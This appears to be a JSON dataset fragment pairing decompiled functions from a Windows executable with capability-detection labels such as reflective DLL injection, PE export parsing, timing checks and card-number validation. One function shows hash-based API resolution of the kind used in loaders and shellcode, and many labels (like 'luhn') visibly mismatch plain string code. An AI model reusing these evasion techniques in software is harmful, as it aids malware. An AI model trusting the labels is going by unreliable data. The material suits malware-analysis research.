        "decompiled_code": "\nint32_t fcn.004538fd(uint8_t *param_1)\n\n{\n    int32_t iVar1;\n    uint32_t extraout_ECX;\n    uint32_t uVar2;\n    ulong uVar3;\n    \n    iVar1 = 0;\n    if (param_1 != NULL) goto code_r0x00453915;\n    uVar3 = fcn.0041901a();\n    uVar2 = extraout_ECX;\n    do {\n        iVar1 = uVar3 * 0x21 + uVar2;\n        param_1 = (uVar3 >> 0x20) + 1;\ncode_r0x00453915:\n        uVar3 = CONCAT44(param_1, iVar1);\n        uVar2 = *param_1;\n    } while (*param_1 != 0);\n    return iVar1;\n}\n",
        "token_count": 186
    },
    "0047a692": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nvoid fcn.0047a692(void)\n\n{\n    uint8_t *puVar1;\n    int32_t unaff_EBP;\n    uint32_t unaff_ESI;\n    int32_t unaff_EDI;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x1c) == unaff_EDI) {\n        puVar1 = *((unaff_ESI >> 5) * 4 + 0x4af080) + 4 + (unaff_ESI & 0x1f) * 0x28;\n        *puVar1 = *puVar1 & 0xfe;\n    }\n    fcn.0047a3e4();\n    return;\n}\n",
        "token_count": 156
    },
    "0048105a": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/77a25ea9f6f245cfb8807f7953974472",
            "validate payment card number using luhn algorithm with no lookup table/101d11b5106849ad963488c88a9294b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0048105a(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    uint arg_8h;\n    uint var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x4a9ec8 ^ &stack0xfffffffc;\n    iVar4 = 0;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetThreadLocale)();\n    arg_8h = 0x1004;\n    iVar2 = (*_sym.imp.KERNEL32.dll_GetLocaleInfoA)(uVar1, 0x1004, &var_ch, 7);\n    if (iVar2 != 0) {\n        puVar3 = &var_ch;\n        if (var_ch != '\\0') {\n            do {\n                puVar3 = puVar3 + 1;\n                iVar4 = iVar4 * 10 + -0x30 + var_ch;\n                var_ch._0_1_ = *puVar3;\n            } while (var_ch != '\\0');\n            if (iVar4 != 0) goto code_r0x004810b0;\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_GetACP)();\ncode_r0x004810b0:\n    fcn.004566a8(arg_8h);\n    return;\n}\n",
        "token_count": 309
    },
    "00401150": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * fcn.00401150(int32_t *param_1)\n\n{\n    int32_t *piVar1;\n    int32_t *extraout_ECX;\n    \n    piVar1 = *param_1;\n    if (piVar1 == NULL) {\n        piVar1 = fcn.0041901a();\n        param_1 = extraout_ECX;\n    }\n    *param_1 = *piVar1;\n    return piVar1 + 2;\n}\n",
        "token_count": 106
    },
    "00401440": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00401440(int32_t *param_1, int32_t param_2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    int32_t iVar5;\n    int32_t *unaff_EBP;\n    int32_t **ppiVar6;\n    \n    iVar2 = *param_1;\n    iVar3 = *(iVar2 + -0xc);\n    ppiVar6 = iVar2 + -0x10;\n    puVar4 = (**(**ppiVar6 + 0x10))();\n    iVar5 = (***puVar4)(param_2, 1);\n    if (iVar5 == 0) {\n        fcn.00401430();\n    }\n    if (iVar3 < param_2) {\n        param_2 = iVar3;\n    }\n    fcn.00456177(iVar5 + 0x10, param_2 + 1, iVar2, param_2 + 1);\n    *(iVar5 + 4) = iVar3;\n    piVar1 = iVar2 + -4;\n    LOCK();\n    iVar2 = *piVar1;\n    *piVar1 = *piVar1 + -1;\n    if (iVar2 == 1 || iVar2 + -1 < 0) {\n        (**(**ppiVar6 + 4))(ppiVar6);\n    }\n    *unaff_EBP = iVar5 + 0x10;\n    return;\n}\n",
        "token_count": 330
    },
    "00401680": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * __thiscall fcn.00401680(int32_t *param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    int32_t *extraout_ECX;\n    \n    if (param_2 == NULL) {\n        fcn.00401070(0x80004005);\n        param_2 = extraout_ECX;\n    }\n    iVar1 = (**(*param_2 + 0xc))();\n    *param_1 = iVar1 + 0x10;\n    return param_1;\n}\n",
        "token_count": 121
    },
    "00401820": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00401820(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = (*_sym.imp.USER32.dll_SendMessageA)(*(param_1 + 0x20), 0x146, 0, 0);\n    iVar2 = 0;\n    if (0 < iVar1) {\n        do {\n            fcn.004015f0();\n            iVar2 = iVar2 + 1;\n        } while (iVar2 < iVar1);\n    }\n    return;\n}\n",
        "token_count": 123
    },
    "004018d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.004018d0(int32_t *param_1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    piVar1 = fcn.00423280();\n    if (piVar1 == NULL) {\n        piVar1 = fcn.00401070(0x80004005);\n    }\n    iVar2 = (**(*piVar1 + 0xc))();\n    *param_1 = iVar2 + 0x10;\n    return param_1;\n}\n",
        "token_count": 118
    },
    "00401920": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * __thiscall fcn.00401920(int32_t *param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.004017b0(*param_2 + -0x10);\n    *param_1 = iVar1 + 0x10;\n    return param_1;\n}\n",
        "token_count": 81
    },
    "00401d30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * __thiscall fcn.00401d30(int32_t *param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.004017b0(*param_2 + -0x10);\n    *param_1 = iVar1 + 0x10;\n    return param_1;\n}\n",
        "token_count": 82
    },
    "00401d80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00401d80(int32_t *param_1, int32_t param_2, int32_t param_3)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t extraout_ECX;\n    int32_t unaff_EBP;\n    int32_t unaff_EDI;\n    uint32_t uVar3;\n    int32_t unaff_retaddr;\n    int32_t in_stack_ffffffec;\n    \n    if (param_3 == 0) {\n        fcn.004016d0();\n        return;\n    }\n    if (param_2 != 0) goto code_r0x00401da8;\n    do {\n        fcn.00401070();\n        param_2 = extraout_ECX;\ncode_r0x00401da8:\n        iVar1 = *param_1;\n        uVar2 = *(iVar1 + -0xc);\n        uVar3 = param_2 - iVar1;\n        if ((1U - *(iVar1 + -4) | *(iVar1 + -8) - param_3) < 0) {\n            param_2 = unaff_retaddr;\n            in_stack_ffffffec = param_3;\n            fcn.00401760(param_3, unaff_EDI, unaff_EBP);\n            unaff_retaddr = param_2;\n        }\n        unaff_EBP = unaff_EDI;\n        unaff_EDI = in_stack_ffffffec;\n        iVar1 = *param_1;\n        if (uVar2 < uVar3) {\n            fcn.00456177(iVar1, param_3, param_2, param_3);\n        }\n        else {\n            fcn.004561f2(iVar1, param_3, iVar1 + uVar3, param_3);\n        }\n        in_stack_ffffffec = unaff_EDI;\n    } while ((param_3 < 0) || (*(*param_1 + -8) < param_3));\n    *(*param_1 + -0xc) = param_3;\n    *(param_3 + *param_1) = 0;\n    return;\n}\n",
        "token_count": 472
    },
    "00402100": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00402100(int32_t *param_1, uint param_2, int32_t param_3, uint param_4, int32_t param_5)\n\n{\n    int32_t arg_8h;\n    code *pcVar1;\n    \n    param_5 = param_3 + param_5;\n    if ((1U - *(*param_1 + -4) | *(*param_1 + -8) - param_5) < 0) {\n        fcn.00401760(param_5);\n    }\n    arg_8h = *param_1;\n    fcn.00456177(arg_8h, param_3, param_1, param_3);\n    fcn.00456177(arg_8h + param_3, param_4, param_3, param_4);\n    if ((-1 < param_5) && (param_5 <= *(*param_1 + -8))) {\n        *(*param_1 + -0xc) = param_5;\n        *(param_5 + *param_1) = 0;\n        return;\n    }\n    fcn.00401070(0x80070057);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 274
    },
    "00402180": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00402180(int32_t *param_1, int32_t param_2, int32_t param_3)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    code *pcVar4;\n    int32_t unaff_retaddr;\n    \n    iVar2 = *param_1;\n    uVar3 = *(iVar2 + -0xc);\n    iVar1 = param_3 + uVar3;\n    if ((1U - *(iVar2 + -4) | *(iVar2 + -8) - iVar1) < 0) {\n        fcn.00401760(iVar1);\n        param_3 = param_2;\n    }\n    if (param_2 - iVar2 <= uVar3) {\n        unaff_retaddr = *param_1 + (param_2 - iVar2);\n    }\n    fcn.00456177(*param_1 + uVar3, param_3, unaff_retaddr, param_3);\n    if ((-1 < iVar1) && (iVar1 <= *(*param_1 + -8))) {\n        *(*param_1 + -0xc) = iVar1;\n        *(iVar1 + *param_1) = 0;\n        return;\n    }\n    fcn.00401070(0x80070057);\n    pcVar4 = swi(3);\n    (*pcVar4)();\n    return;\n}\n",
        "token_count": 314
    },
    "00402280": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00402280(char *param_1)\n\n{\n    char cVar1;\n    char *pcVar2;\n    \n    if (param_1 == NULL) {\n        fcn.00401d80(0, 0);\n        return;\n    }\n    pcVar2 = param_1;\n    do {\n        cVar1 = *pcVar2;\n        pcVar2 = pcVar2 + 1;\n    } while (cVar1 != '\\0');\n    fcn.00401d80(param_1, pcVar2 - (param_1 + 1));\n    return;\n}\n",
        "token_count": 131
    },
    "004022c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nchar ** __fastcall fcn.004022c0(char **param_1)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    char *pcVar3;\n    char *pcVar4;\n    \n    pcVar3 = *param_1;\n    cVar1 = *pcVar3;\n    pcVar4 = NULL;\n    if (cVar1 != '\\0') {\n        do {\n            iVar2 = fcn.004560af(cVar1);\n            if (iVar2 == 0) {\n                pcVar4 = NULL;\n            }\n            else if (pcVar4 == NULL) {\n                pcVar4 = pcVar3;\n            }\n            pcVar3 = fcn.00455f19(pcVar3);\n            cVar1 = *pcVar3;\n        } while (cVar1 != '\\0');\n        if (pcVar4 != NULL) {\n            fcn.004020b0(pcVar4 - *param_1);\n        }\n    }\n    return param_1;\n}\n",
        "token_count": 218
    },
    "00402310": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "inject DLL reflectively/5c249d14806d4a4ea88afb4f94553771"
        ],
        "decompiled_code": "\nint32_t * fcn.00402310(int32_t *param_1, uint8_t param_2, int32_t *param_3)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    int32_t **in_FS_OFFSET;\n    int32_t *piStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    piVar1 = param_3;\n    uStack8 = 0x481d29;\n    piStack12 = *in_FS_OFFSET;\n    uVar2 = *0x4a9ec8 ^ &stack0xffffffe8;\n    *in_FS_OFFSET = &piStack12;\n    uStack4 = 0;\n    if (*(*param_3 + -0x10) != NULL) {\n        piVar3 = (**(**(*param_3 + -0x10) + 0x10))(uVar2);\n        if (piVar3 != NULL) goto code_r0x00402369;\n    }\n    piVar3 = fcn.00423280();\n    piVar3 = (**(*piVar3 + 0x10))();\ncode_r0x00402369:\n    if (piVar3 == NULL) {\n        piVar3 = fcn.00401070(0x80004005);\n    }\n    iVar4 = (**(*piVar3 + 0xc))();\n    *param_1 = iVar4 + 0x10;\n    param_3 = param_3 & 0xffffff00 | param_2;\n    uStack4 = 0;\n    fcn.00402100(param_1, &param_3, 1, *piVar1, *(*piVar1 + -0xc));\n    *in_FS_OFFSET = piStack12;\n    return param_1;\n}\n",
        "token_count": 406
    },
    "00402a10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00402a10(uint param_1)\n\n{\n    int32_t iVar1;\n    uint unaff_ESI;\n    int32_t *piVar2;\n    uint uStack564;\n    uint uStack560;\n    uchar *puStack556;\n    uint uStack552;\n    uchar *puStack548;\n    uchar auStack540 [12];\n    uchar auStack528 [524];\n    uint32_t uStack4;\n    \n    puStack548 = &stack0xfffffde4;\n    uStack4 = *0x4a9ec8 ^ &stack0xfffffde4;\n    uStack552 = 0x402a37;\n    iVar1 = (*_sym.imp.SHELL32.dll_SHGetDesktopFolder)();\n    if (-1 < iVar1) {\n        uStack552 = 0x104;\n        puStack556 = &stack0xfffffdf0;\n        uStack560 = 0xffffffff;\n        uStack564 = param_1;\n        (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)(0);\n        piVar2 = NULL;\n        (**(*0x1 + 0xc))(1, 0, 0, &stack0xfffffdd8, &stack0xfffffdd4, &stack0xfffffdcc, &stack0xfffffdd0);\n        (**(*piVar2 + 8))(piVar2);\n    }\n    puStack548 = 0x402a95;\n    fcn.004566a8(unaff_ESI);\n    return;\n}\n",
        "token_count": 328
    },
    "00402b10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.00402b10(uint param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    uint16_t *puVar2;\n    uint16_t *puVar3;\n    uint32_t unaff_EDI;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_LoadResource)(param_1, param_2);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    puVar2 = (*_sym.imp.KERNEL32.dll_LockResource)(iVar1);\n    if (puVar2 != NULL) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_SizeofResource)(param_1, param_2);\n        puVar3 = iVar1 + puVar2;\n        for (unaff_EDI = unaff_EDI & 0xf; unaff_EDI != 0; unaff_EDI = unaff_EDI - 1) {\n            if (puVar3 <= puVar2) {\n                return 0;\n            }\n            puVar2 = puVar2 + *puVar2 + 1;\n        }\n        if (puVar2 < puVar3) {\n            return -(*puVar2 != 0) & puVar2;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 278
    },
    "00402b80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00402b80(uint param_1, uint32_t param_2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_FindResourceA)(param_1, (param_2 >> 4) + 1 & 0xffff, 6);\n    if (iVar1 == 0) {\n        return;\n    }\n    fcn.00402b10(param_1, iVar1, param_2);\n    return;\n}\n",
        "token_count": 107
    },
    "00402c50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __thiscall fcn.00402c50(int32_t *param_1, uint param_2, uint32_t param_3)\n\n{\n    ushort uVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    ushort *puVar4;\n    uint uVar5;\n    \n    iVar3 = (*_sym.imp.KERNEL32.dll_FindResourceA)(param_2, (param_3 >> 4) + 1 & 0xffff, 6);\n    if (iVar3 != 0) {\n        puVar4 = fcn.00402b10(param_2, iVar3, param_3);\n        if (puVar4 != NULL) {\n            uVar1 = *puVar4;\n            uVar5 = (**0x4ab49c)();\n            iVar3 = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(uVar5, 0, puVar4 + 1, uVar1, 0, 0, 0, 0);\n            if ((1U - *(*param_1 + -4) | *(*param_1 + -8) - iVar3) < 0) {\n                fcn.00401760(iVar3);\n            }\n            uVar5 = (**0x4ab49c)(0, puVar4 + 1, *puVar4, *param_1, iVar3, 0, 0);\n            (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(uVar5);\n            if ((-1 < iVar3) && (iVar3 <= *(*param_1 + -8))) {\n                *(*param_1 + -0xc) = iVar3;\n                *(iVar3 + *param_1) = 0;\n                return 1;\n            }\n            fcn.00401070(0x80070057);\n            pcVar2 = swi(3);\n            uVar5 = (*pcVar2)();\n            return uVar5;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 435
    },
    "00402d20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid fcn.00402d20(int32_t param_1, int32_t param_2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint unaff_EBP;\n    int32_t *unaff_ESI;\n    uint32_t **in_FS_OFFSET;\n    int32_t unaff_retaddr;\n    int32_t iStack312;\n    uint uStack308;\n    uint uStack304;\n    uint uStack300;\n    uint uStack296;\n    uint uStack292;\n    int32_t iStack288;\n    uint auStack284 [67];\n    uint32_t *puStack16;\n    uint32_t *puStack12;\n    uint32_t uStack8;\n    uint uStack4;\n    \n    uStack8 = 0x481dd0;\n    puStack12 = *in_FS_OFFSET;\n    puStack16 = *0x4a9ec8 ^ &iStack312;\n    piVar1 = *0x4a9ec8 ^ &stack0xfffffebc;\n    *in_FS_OFFSET = &puStack12;\n    uStack4 = 1;\n    iVar2 = (*_sym.imp.SHELL32.dll_SHGetMalloc)(&iStack312);\n    if (-1 < iVar2) {\n        uStack308 = 0;\n        uStack296 = 0;\n        uStack292 = 0;\n        iStack288 = 0;\n        auStack284[0] = 0;\n        iStack312 = param_1;\n        uStack304 = 0;\n        uStack300 = 0;\n        uStack308 = fcn.00402a10(param_2);\n        uStack296 = 5;\n        uStack292 = 0x402aa0;\n        if ((*(param_1 + -8) | 1U - *(param_1 + -4)) < 0) {\n            param_1 = unaff_retaddr;\n            fcn.00401760(0);\n        }\n        iStack288 = param_1;\n        iVar2 = (*_sym.imp.SHELL32.dll_SHBrowseForFolderA)(&iStack312);\n        if (iVar2 != 0) {\n            (*_sym.imp.SHELL32.dll_SHGetPathFromIDListA)(iVar2, auStack284);\n        }\n        (**(*unaff_ESI + 0x14))(unaff_ESI, iVar2);\n        (**(*piVar1 + 8))(piVar1);\n    }\n    uStack8 = uStack8 & 0xffffff00;\n    piVar1 = param_1 + -4;\n    LOCK();\n    iVar2 = *piVar1;\n    *piVar1 = *piVar1 + -1;\n    if (iVar2 + -1 < 1) {\n        (**(**(param_1 + -0x10) + 4))(param_1 + -0x10);\n    }\n    uStack8 = 0xffffffff;\n    piVar1 = param_2 + -4;\n    LOCK();\n    iVar2 = *piVar1;\n    *piVar1 = *piVar1 + -1;\n    if (iVar2 == 1 || iVar2 + -1 < 0) {\n        (**(**(param_2 + -0x10) + 4))(param_2 + -0x10);\n    }\n    *in_FS_OFFSET = puStack16;\n    fcn.004566a8(unaff_EBP);\n    return;\n}\n",
        "token_count": 747
    },
    "00402f40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.00402f40(int32_t *param_1)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    char *pcVar5;\n    int32_t *unaff_EDI;\n    int32_t **in_FS_OFFSET;\n    char *unaff_retaddr;\n    int32_t *piStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack4 = 0xffffffff;\n    uStack8 = 0x481e08;\n    piStack12 = *in_FS_OFFSET;\n    uVar2 = *0x4a9ec8 ^ &stack0xffffffe8;\n    *in_FS_OFFSET = &piStack12;\n    piVar3 = fcn.00423280(uVar2);\n    if (piVar3 == NULL) {\n        piVar3 = fcn.00401070(0x80004005);\n    }\n    iVar4 = (**(*piVar3 + 0xc))();\n    *param_1 = iVar4 + 0x10;\n    uStack8 = 0;\n    if (unaff_retaddr == NULL) {\n        iVar4 = 0;\n    }\n    else {\n        if ((unaff_retaddr & 0xffff0000) == 0) {\n            iVar4 = fcn.0042422a(unaff_retaddr & 0xffff);\n            if (iVar4 != 0) {\n                fcn.00402c50(iVar4, unaff_retaddr & 0xffff);\n            }\n            goto code_r0x00402fe4;\n        }\n        pcVar5 = unaff_retaddr;\n        do {\n            cVar1 = *pcVar5;\n            pcVar5 = pcVar5 + 1;\n        } while (cVar1 != '\\0');\n        iVar4 = pcVar5 - (unaff_retaddr + 1);\n    }\n    fcn.00401d80(unaff_retaddr, iVar4);\ncode_r0x00402fe4:\n    *in_FS_OFFSET = unaff_EDI;\n    return param_1;\n}\n",
        "token_count": 470
    },
    "00403070": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00403070(void)\n\n{\n    uint32_t uVar1;\n    int32_t **in_FS_OFFSET;\n    int32_t *piStack12;\n    uint uStack8;\n    uint32_t uStack4;\n    \n    uStack8 = 0x481e43;\n    piStack12 = *in_FS_OFFSET;\n    uVar1 = *0x4a9ec8 ^ &stack0xffffffec;\n    *in_FS_OFFSET = &piStack12;\n    uStack4 = 1;\n    fcn.00415180(uVar1);\n    uStack4 = uStack4 & 0xffffff00;\n    fcn.00427958();\n    uStack4 = 0xffffffff;\n    fcn.00426975();\n    *in_FS_OFFSET = piStack12;\n    return;\n}\n",
        "token_count": 177
    },
    "00403300": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.00403300(char *param_1)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    \n    uVar2 = 0;\n    cVar1 = *param_1;\n    while (cVar1 != '\\0') {\n        iVar3 = cVar1;\n        if ('`' < cVar1) {\n            iVar3 = iVar3 + -0x20;\n        }\n        param_1 = param_1 + 1;\n        uVar2 = (uVar2 >> 0xd | uVar2 << 0x13) + iVar3;\n        cVar1 = *param_1;\n    }\n    return uVar2;\n}\n",
        "token_count": 159
    },
    "00403330": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "contain loop",
            "resolve function by parsing PE exports"
        ],
        "decompiled_code": "\nint32_t fcn.00403330(int32_t param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    \n    iVar5 = *(*(param_1 + 0x3c) + 0x78 + param_1);\n    iVar1 = *(iVar5 + 0x20 + param_1);\n    iVar2 = *(iVar5 + 0x1c + param_1);\n    iVar3 = *(iVar5 + 0x24 + param_1);\n    uVar4 = *(iVar5 + param_1 + 0x18);\n    uVar6 = 0;\n    if (uVar4 != 0) {\n        do {\n            iVar5 = fcn.00403300(*(iVar1 + param_1 + uVar6 * 4) + param_1);\n            if (iVar5 == param_2) {\n                return *(iVar2 + param_1 + *(iVar3 + param_1 + uVar6 * 2) * 4) + param_1;\n            }\n            uVar6 = uVar6 + 1;\n        } while (uVar6 < uVar4);\n    }\n    return 0;\n}\n",
        "token_count": 297
    },
    "004039d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004039d0(uint *param_1, int32_t param_2)\n\n{\n    uint *extraout_ECX;\n    int32_t extraout_EDX;\n    \n    if (param_2 == 0) {\n        fcn.00401070(0x80004005);\n        param_1 = extraout_ECX;\n        param_2 = extraout_EDX;\n    }\n    fcn.00456b7a(*param_1, param_2);\n    return;\n}\n",
        "token_count": 113
    },
    "00403b40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.00403b40(int32_t param_1, uint *param_2, uint32_t param_3)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint *puVar5;\n    \n    uVar1 = param_2;\n    if (*(param_1 + 0x14) < param_2) {\n        fcn.00480fc4();\n    }\n    uVar2 = *(param_1 + 0x14) - param_2;\n    if (uVar2 < param_3) {\n        param_3 = uVar2;\n    }\n    if (param_3 != 0) {\n        puVar5 = param_1 + 4;\n        puVar4 = puVar5;\n        param_2 = puVar5;\n        if (0xf < *(param_1 + 0x18)) {\n            puVar4 = *puVar5;\n            param_2 = *puVar5;\n        }\n        fcn.004561f2(puVar4 + uVar1, *(param_1 + 0x18) - uVar1, param_2 + param_3 + uVar1, uVar2 - param_3);\n        iVar3 = *(param_1 + 0x14) - param_3;\n        *(param_1 + 0x14) = iVar3;\n        if (0xf < *(param_1 + 0x18)) {\n            puVar5 = *puVar5;\n        }\n        *(iVar3 + puVar5) = 0;\n    }\n    return param_1;\n}\n",
        "token_count": 371
    },
    "00403d20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00403d20(int32_t param_1)\n\n{\n    if (0xf < *(param_1 + 0x18)) {\n        fcn.004170df(*(param_1 + 4));\n    }\n    *(param_1 + 0x18) = 0xf;\n    *(param_1 + 0x14) = 0;\n    *(param_1 + 4) = 0;\n    return;\n}\n",
        "token_count": 101
    },
    "00403e10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.00403e10(int32_t param_1, int32_t param_2, uint32_t param_3, uint32_t param_4)\n\n{\n    int32_t *arg_8h;\n    int32_t *piVar1;\n    uint32_t arg_14h;\n    \n    if (*(param_2 + 0x14) < param_3) {\n        fcn.00480fc4();\n    }\n    arg_14h = *(param_2 + 0x14) - param_3;\n    if (param_4 < arg_14h) {\n        arg_14h = param_4;\n    }\n    if (param_1 != param_2) {\n        if (arg_14h == 0xffffffff) {\n            fcn.00480f85();\n        }\n        if (*(param_1 + 0x18) < arg_14h) {\n            fcn.00403bd0(arg_14h, *(param_1 + 0x14));\n        }\n        else if (arg_14h == 0) {\n            *(param_1 + 0x14) = 0;\n            if (*(param_1 + 0x18) < 0x10) {\n                *(param_1 + 4) = 0;\n                return param_1;\n            }\n            **(param_1 + 4) = 0;\n            return param_1;\n        }\n        if (arg_14h != 0) {\n            if (*(param_2 + 0x18) < 0x10) {\n                param_2 = param_2 + 4;\n            }\n            else {\n                param_2 = *(param_2 + 4);\n            }\n            piVar1 = param_1 + 4;\n            arg_8h = piVar1;\n            if (0xf < *(param_1 + 0x18)) {\n                arg_8h = *piVar1;\n            }\n            fcn.00456177(arg_8h, *(param_1 + 0x18), param_2 + param_3, arg_14h);\n            *(param_1 + 0x14) = arg_14h;\n            if (0xf < *(param_1 + 0x18)) {\n                piVar1 = *piVar1;\n            }\n            *(piVar1 + arg_14h) = 0;\n        }\n        return param_1;\n    }\n    fcn.00403b40(arg_14h + param_3, 0xffffffff);\n    fcn.00403b40(0, param_3);\n    return param_1;\n}\n",
        "token_count": 581
    },
    "00403ef0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
